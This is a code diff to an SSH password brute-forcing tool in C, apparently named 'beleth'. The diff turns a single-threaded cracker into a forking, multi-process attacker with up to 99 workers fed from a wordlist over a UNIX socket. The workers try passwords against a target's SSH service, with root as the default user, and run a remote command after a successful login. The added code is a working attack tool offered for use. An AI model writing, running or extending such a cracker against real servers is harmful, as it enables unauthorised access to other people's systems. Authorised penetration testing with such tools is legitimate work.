@@ -3,85 +3,27 @@
  */ 
 
 #include <libssh2.h>
-#include <libssh2_sftp.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/types.h>
 #include <fcntl.h>
-#include <errno.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <ctype.h>
+#include <sys/un.h>
+#include <time.h>
+#include <sys/wait.h>
+#include <errno.h>
 
-#define MAX_PW_LENGTH 51
+#include "beleth.h"
+#include "lists.h"
+#include "ssh.h"
 
-/* Linked list to hold the word list */
-struct pw_list
-{
-    char pw[MAX_PW_LENGTH];
-    struct pw_list *next;
-};
-
-struct pw_list *head = NULL;
-struct pw_list *tail = NULL;
-
-/* 
- * Initiate the linked list with the first element
- * Returns -1 on error. 1 on success
- */
-int init_pw_list(char *pw) {
-    struct pw_list *ptr = (struct pw_list*)malloc(sizeof(struct pw_list));
-
-    if(ptr == NULL)
-    {
-        fprintf(stderr,"[!] Creating password linked list failed.\n");
-        return -1;
-    }
-	strncpy(ptr->pw, pw, MAX_PW_LENGTH);
-    ptr->next = NULL;
-
-    head = tail = ptr;
-    return 1;	
-}
-
-/*
- * Add entry to the end of the linked list
- * Returns -1 on error. 1 on success
- */
-int add_pw_list(char *pw) {
-	if(head == NULL)  
-        return (init_pw_list(pw));
-	
-    struct pw_list *ptr = (struct pw_list*)malloc(sizeof(struct pw_list));
-    if(ptr == NULL) {
-        fprintf(stderr,"[!] Couldn't add to linked list.\n");
-        return -1;
-    }
-
-    strncpy(ptr->pw,pw,MAX_PW_LENGTH);
-    ptr->next = NULL;
-	
-    tail->next = ptr;
-    tail = ptr;
-
-    return 1;
-}
-
-/*
- * Destroy the linked list and free the memory
- */
-void destroy_pw_list(void) {
-	struct pw_list *ptr = head;
-	
-	while (ptr != NULL) {
-		printf("Destroying: %s\n", head->pw);
-		ptr = head->next;
-		free(head);
-		head = ptr;
-	}
-}
+char *sock_file = "beleth.sock";
+char username[50] = "root";
+char cmdline[256] = "uname -a && id";
 
 /* 
  * Add each line of the wordlist to the linked list
@@ -89,6 +31,7 @@ void destroy_pw_list(void) {
 int read_wordlist(char *path) {
 	FILE *wordlist;
 	char line[256];
+	int cnt = 0;
 	
 	wordlist = fopen(path,"r");
 	if (wordlist == NULL) {
@@ -97,132 +40,13 @@ int read_wordlist(char *path) {
 	}
 	
 	while (fgets(line,sizeof(line)-1, wordlist) != NULL) {
-			line[strlen(line)-1] = '\0';
+			++cnt;
 			add_pw_list(line);
 	}
+	
+	fprintf(stdout, "[*] Read %d passwords from file.\n",cnt);
+		
 	fclose(wordlist);
-	return 1;
-}
-
-/* 
- * Taken from libssh2 examples 
- * Used while dropping the payload and waiting for the response.
- */
-static int waitsocket(int socket_fd, LIBSSH2_SESSION *session) {
-    struct timeval timeout;
-    int rc;
-    fd_set fd;
-    fd_set *writefd = NULL;
-    fd_set *readfd = NULL;
-    int dir;
- 
-    timeout.tv_sec = 10;
-    timeout.tv_usec = 0;
- 
-    FD_ZERO(&fd);
- 
-    FD_SET(socket_fd, &fd);
- 
-    /* now make sure we wait in the correct direction */ 
-    dir = libssh2_session_block_directions(session);
-
- 
-    if(dir & LIBSSH2_SESSION_BLOCK_INBOUND)
-        readfd = &fd;
- 
-    if(dir & LIBSSH2_SESSION_BLOCK_OUTBOUND)
-        writefd = &fd;
- 
-    rc = select(socket_fd + 1, readfd, writefd, NULL, &timeout);
- 
-    return rc;
-}
-
-/*
- * Close libssh2 variables out and terminate sockfd 
- */
-void session_cleanup(int sock, LIBSSH2_SESSION *session) {
-	libssh2_session_disconnect(session, "exit");
-    libssh2_session_free(session);
-    close(sock);
-}
-
-/* 
- * Setup socket file descriptor with a connection 
- * to char *host using int port
- * session pointer should be properly initialized prior to calling this
- * session = libssh2_session_init();
- */
-int session_init(char *host, int port, LIBSSH2_SESSION *session) {
-	int sock;
-	unsigned long hostaddr;
-	struct sockaddr_in sin;
-	
-	hostaddr = inet_addr(host);
-	
-	sock = socket(AF_INET, SOCK_STREAM, 0);
- 
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(port);
-    sin.sin_addr.s_addr = hostaddr;
-    if (connect(sock, (struct sockaddr*)(&sin),
-                sizeof(struct sockaddr_in)) != 0) 
-        return -1;
-
-	libssh2_session_set_timeout(session, 5000);
-
-	if (libssh2_session_handshake(session, sock)) 
-		return -1;
-    
-	return sock;
- 
-}
-
-int drop_payload(int sock, LIBSSH2_SESSION *session, char *cmdline) {
-	int rc;
-	LIBSSH2_CHANNEL *channel;
-	
-	/* Request a shell */ 
-    if (!(channel = libssh2_channel_open_session(session))) {
-
-        fprintf(stderr, "[!] Unable to open a session\n");
-        session_cleanup(sock, session);
-    }
- 
-    /* Execute cmdline remotely and display response */    
-    while ( ( rc = libssh2_channel_exec(channel, cmdline) ) == LIBSSH2_ERROR_EAGAIN )
-		waitsocket(sock,session);
-		
-	if (rc != 0) {
-		fprintf(stderr, "[!] CMD Exec failed.\n");
-		return -1;
-	}
-	
-	while(1) {
-		do
-		{
-			char buffer[65535];
-			rc = libssh2_channel_read( channel, buffer, sizeof(buffer) );
-			
-			if (rc > 0)
-				printf("%s",buffer);
-		}while (rc > 0);
-		
-		if ( rc == LIBSSH2_ERROR_EAGAIN )
-			waitsocket(sock, session);
-		else
-			break;
-	}
-	
-	while ( (rc = libssh2_channel_close(channel)) == LIBSSH2_ERROR_EAGAIN )
-		waitsocket(sock,session);
-		
-	if (channel) {
-        libssh2_channel_free(channel);
-
-        channel = NULL;
-    }
-	
 	return 1;
 }
 
@@ -235,27 +59,226 @@ void print_help(char *cmd) {
 	fprintf(stderr,"\t-p [port]\tSpecify remote port\n");
 	fprintf(stderr,"\t-t [target]\tAttempt connections to this server\n");
 	fprintf(stderr,"\t-u [user]\tAttempt connection using this username\n");
-	fprintf(stderr,"\t-v\t\tTurn on verbose mode\n");
+	fprintf(stderr,"\t-v\t\t-v (Show attempts) -vv (Show debugging)\n");
 	fprintf(stderr,"\t-w [wordlist]\tUse this wordlist. Defaults to wordlist.txt\n");	
 }
 
+/* 
+ * crack_thread 
+ * Called as the child process of fork. 
+ */
+void crack_thread(struct t_ctx *c_thread) {
+	char buf[256];
+	int rc;
+	
+	if (verbose >= VERBOSE_DEBUG) 
+		fprintf(stderr, "[*] (%d) Connecting to: %s:%d\n",getpid(),c_thread->host,c_thread->port);
+    
+    
+    while ((c_thread->sock = session_init(c_thread->host,c_thread->port,c_thread->session)) == -1) {
+		if (verbose >= VERBOSE_DEBUG) 
+			fprintf(stderr,"[!] Unable to connect to %s:%d\n",c_thread->host,c_thread->port);
+		session_cleanup(c_thread->sock, c_thread->session);
+		c_thread->session = libssh2_session_init();
+		
+		sleep(1);
+	}
+	
+	while (1) {
+		memset(buf,0x00,sizeof(buf));
+		snprintf(buf, sizeof(buf)-1,"%c",REQ_PW);
+		write(c_thread->fd, buf, strlen(buf));
+		rc = read(c_thread->fd, buf, sizeof(buf)-1);
+		if (rc == -1) {
+			if (verbose >= VERBOSE_DEBUG)
+				fprintf(stderr, "[!] Error reading from UNIX sock\n");
+			return;
+		}
+		if (buf[0] == NO_PW) { /* Cleanup if there's no more work */
+			session_cleanup(c_thread->sock, c_thread->session);
+			exit(0);
+		} 
+		buf[strlen(buf)-1] = '\0'; /* Trim of new line */
+		
+		if (verbose >= VERBOSE_ATTEMPTS)
+			fprintf(stderr,"[+] (%d) Trying %s %s\n",getpid(),username,buf);
+		if ((rc=libssh2_userauth_password(c_thread->session, username, buf))) {
+			if (rc != LIBSSH2_ERROR_AUTHENTICATION_FAILED) {
+					session_cleanup(c_thread->sock, c_thread->session);
+					
+					c_thread->session = libssh2_session_init();
+					
+					while ( (c_thread->sock = session_init(c_thread->host,c_thread->port, c_thread->session)) == -1) {
+						if (verbose >= VERBOSE_DEBUG) 
+							fprintf(stderr, "[!] Unable to reconnect to %s:%d\n",c_thread->host,c_thread->port);	
+						session_cleanup(c_thread->sock,c_thread->session);
+						
+						sleep(1);
+					}
+			}
+		} else {
+			printf("[*] Authentication succeeded (%s:%s@%s:%d)\n",username, buf, c_thread->host, c_thread->port);
+			if (drop_payload(c_thread->sock,c_thread->session,(char *)cmdline) == -1) {
+				if (verbose >= VERBOSE_DEBUG)
+					fprintf(stderr, "Error executing command.\n");
+			}   
+			memset(buf,0x00,sizeof(buf));
+			buf[0] = FND_PW;
+			buf[1] = '\n';
+			write(c_thread->fd,buf,strlen(buf));
+			return;
+			break;
+		}
+	}
+}
+
+/*
+ * listen_sock
+ * Handle listening and accepting unix socket domains 
+ * Returns -1 on error. file descriptor to listening socket on success
+ */
+int listen_sock(int backlog) {
+	struct sockaddr_un addr;
+	int fd,optval=1;
+	
+	if ((fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
+		if (verbose >= VERBOSE_DEBUG)
+			fprintf(stderr, "[!] Error setting up UNIX socket\n");
+		return -1;
+	}
+	
+	fcntl(fd, F_SETFL, O_NONBLOCK); /* Set socket to non blocking */
+	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int));
+	
+	memset(&addr,0x00,sizeof(addr));
+	addr.sun_family = AF_UNIX;
+	strncpy(addr.sun_path, sock_file, sizeof(addr.sun_path)-1);
+	
+	unlink(sock_file);
+	
+	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
+		if (verbose >= VERBOSE_DEBUG)
+			fprintf(stderr, "[!] Error binding to UNIX socket\n");
+		return -1;
+	}
+	
+	if (listen(fd, backlog) == -1) {
+		if (verbose >= VERBOSE_DEBUG)
+			fprintf(stderr, "[!] Error listening to UNIX socket\n");
+		return -1;
+	}
+	
+	return fd;
+}
+
+/*
+ * connect_sock
+ * Connect to UNIX sock
+ * Returns -1 on no connection and fd on successful connection
+ */
+int connect_sock(void) {
+	int fd;
+	struct sockaddr_un addr;
+	
+	if ((fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
+		if (verbose >= VERBOSE_DEBUG)
+			fprintf(stderr, "[!] Error creating UNIX socket\n");
+		return -1;
+	}
+	
+    memset(&addr,0x00,sizeof(addr));
+    addr.sun_family = AF_UNIX;
+    strncpy(addr.sun_path, sock_file, sizeof(addr.sun_path)-1);
+    
+    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
+		if (verbose >= VERBOSE_DEBUG)
+			fprintf(stderr, "[!] Error connecting to UNIX socket\n");
+		return -1;
+	}
+	return fd;
+}
+
+/*
+ * init_pw_tasker
+ * Loop through passwords and as needed divy them out
+ * No Return Value
+ */
+void init_pw_tasker(int unix_fd, int threads) {
+	struct pw_list *current_pw = pw_head;
+	int fdmax = unix_fd, i, rc, newfd;
+	int child_count=0, auth=0;
+	fd_set readfds,master;
+		
+	FD_ZERO(&master);
+	FD_SET(unix_fd,&master);
+		
+	while(1) {
+		readfds = master;
+		i = select(fdmax+1,&readfds,NULL,NULL,NULL);
+		if (i > 0) {
+			char buf[256];
+			memset(buf,0x00, sizeof(buf));
+			for (rc = 0; rc <= fdmax; ++rc) {
+				if (FD_ISSET(rc, &readfds)) {
+					if (rc == unix_fd && (newfd = accept(unix_fd,NULL,NULL)) != -1) {
+						if (newfd > fdmax)
+							fdmax = newfd;
+						FD_SET(newfd,&master);
+						continue;
+					}
+
+					read(rc, buf, sizeof(buf)-1);
+					switch(buf[0]) {
+						case REQ_PW:
+							if (current_pw == NULL) {
+								memset(buf,0x00, sizeof(buf));
+								buf[0] = NO_PW;
+								buf[1] = '\n';
+								write(rc,buf,strlen(buf));
+								++child_count;
+								if (verbose >= VERBOSE_DEBUG)
+									fprintf(stderr,"Killing child muahaha: %d / %d\n",child_count,threads);
+								if (child_count == threads) {
+									close(unix_fd);
+									unlink(sock_file);
+									destroy_pw_list();
+									if (auth == 0) 
+										printf("[!] No password matches found.\n");
+									exit(0);
+								}									
+							} else {
+								write(rc, current_pw->pw, strlen(current_pw->pw));
+								current_pw = current_pw->next;
+							}
+							break;
+						case FND_PW:
+							current_pw = NULL;
+							--threads;
+							auth=1;
+							break;
+						default:
+							break;
+					}
+				}
+			}
+		}
+	}
+}
+
 int main(int argc, char *argv[]) {
-    int rc, sock, i, remote_port = 22, auth = 0, c_opt, verbose = 0;
-    int threads=4;    
-    const char *fingerprint;
-    char host[21] = "127.0.0.1", username[50] = "root", str_wordlist[256] = "wordlist.txt";
-    char cmdline[256] = "uname -a && id";
-    LIBSSH2_SESSION *session;
-    struct pw_list *pw_ptr = head;
- 
+    int rc, remote_port = 22, c_opt;
+    int threads = 4, unix_fd, i; 
+  
+    char host[21] = "127.0.0.1", str_wordlist[256] = "wordlist.txt";
+	pid_t pid, task_pid;
+	
+	verbose = 0;
 	rc = libssh2_init (0);
 
 	if (rc != 0) {
 		fprintf (stderr, "[!] libssh2 initialization failed (%d)\n", rc);
 		return 1;
 	}
-	
-	session = libssh2_session_init();
  
     if (argc > 1) {
 		while ((c_opt = getopt(argc, argv, "hvp:t:u:w:c:l:")) != -1) {
@@ -288,8 +311,8 @@ int main(int argc, char *argv[]) {
 						break;
 					case 'l':
 						threads = atoi(optarg);
-						if (threads <= 0 || threads >= 11) {
-							fprintf(stderr, "[!] Thread limit must be between 1 and 10\n");
+						if (threads <= 0 || threads >= 100) {
+							fprintf(stderr, "[!] Thread limit must be between 1 and 99\n");
 							exit(1);
 						}
 						break;
@@ -306,64 +329,48 @@ int main(int argc, char *argv[]) {
 	/* Initiate the linked list using the given wordlist */
     if (read_wordlist(str_wordlist) == -1)
 		return 1;
-
-	if (verbose > 0) 
-		fprintf(stderr, "[*] Connecting to: %s:%d\n",host,remote_port);
-    sock = session_init(host,remote_port,session);
-    if (sock == -1) { 
-		fprintf(stderr,"[!] Unable to connect to %s:%d\n", host,remote_port);
+	
+	printf("[*] Starting task manager\n");	
+	/* Listen to UNIX socket for IPC */
+	if ((unix_fd = listen_sock(threads)) == -1) {
+		destroy_pw_list();
 		exit(1);
 	}
-
-	if (verbose > 0) {
-		fingerprint = libssh2_hostkey_hash(session, LIBSSH2_HOSTKEY_HASH_SHA1);
-		fprintf(stderr, "[*] Fingerprint: ");
-		for(i = 0; i < 20; i++) {
-			fprintf(stderr, "%02X ", (unsigned char)fingerprint[i]);
-		}
-		fprintf(stderr, "\n");
-	}
-		
-	pw_ptr = head;
 	
-	while (pw_ptr != NULL) {
-		if (verbose > 0)
-			fprintf(stderr,"[+] Trying %s %s\n",username,pw_ptr->pw);
-		if ((rc=libssh2_userauth_password(session, username, pw_ptr->pw))) {
-			if (rc != LIBSSH2_ERROR_AUTHENTICATION_FAILED) {
-					session_cleanup(sock, session);
-					
-					session = libssh2_session_init();
-	
-					sock = session_init(host,remote_port, session);
-					if (sock == -1) {
-						fprintf(stderr, "[!] Unable to reconnect to %s:%d\n",host,remote_port);
-						session_cleanup(sock,session);
-						destroy_pw_list();
-						exit(1);
-					}
-			}
-		} else {
-			fprintf(stderr, "[*] Authentication succeeded (%s:%s).\n",username, pw_ptr->pw);
-			auth=1;
-			break;
-		}
-		pw_ptr = pw_ptr->next;
+	pid = fork();
+	if (pid < 0) {
+		fprintf(stderr, "[!] Couldn't fork!\n");
+		destroy_pw_list();
+		exit(1);
+	} else if (pid == 0) { /* Child thread */
+		init_pw_tasker(unix_fd, threads	);	
+	} else {
+		task_pid = pid;
 	}
- 
-	if (auth == 1) {
-		if (drop_payload(sock,session,(char *)cmdline) == -1) {
-			fprintf(stderr, "Error executing command.\n");
+	
+	printf("[*] Spawning %d threads\n",threads);
+	printf("[*] Starting attack on %s@%s:%d\n",username,host,remote_port);
+	/* Loop through and spawn correct number of child threads */
+	for (i = 0; i < threads; ++i) {
+		add_thread_list(pid,host,remote_port);
+		pid = fork();
+		if (pid < 0) {
+			fprintf(stderr, "[!] Couldn't fork!\n");
 			destroy_pw_list();
 			exit(1);
-		}   
-	} else {
-		fprintf(stderr, "[!] No password matches found.\n");
+		} else if (pid == 0)  { 				/* child thread */
+			crack_thread(t_tail);
+			
+			destroy_thread_list();
+		}
 	}
  
-	/* proper cleanup */
-    session_cleanup(sock, session);
-	libssh2_exit();
+	int status; /* Wait for the tasker to clean up */
+	waitpid(task_pid, &status, 0);
+ 
+ 	/* proper cleanup */
+	destroy_thread_list();
 	destroy_pw_list();
+	libssh2_exit();
     return 0;
 }
